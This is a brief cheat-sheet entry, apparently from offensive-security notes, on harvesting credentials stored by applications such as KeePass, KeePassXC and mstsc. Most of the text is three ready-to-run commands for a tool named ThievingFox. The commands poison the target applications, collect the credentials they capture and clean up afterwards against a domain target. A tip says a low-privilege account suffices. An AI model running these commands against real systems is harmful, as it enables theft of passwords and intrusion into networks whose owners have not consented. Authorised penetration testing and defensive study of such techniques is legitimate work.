# Credentials in Third-Party Software

Many applications present on a computer can store credentials, like KeePass, KeePassXC, mstsc and so on.

    python3 client/ThievingFox.py poison --all domain.local/user1:password@<target>
    python3 client/ThievingFox.py collect --all domain.local/user1:password@<target>
    python3 client/ThievingFox.py cleanup --all domain.local/user1:password@<target>

## TIP: It may be used with a low privilege user as well
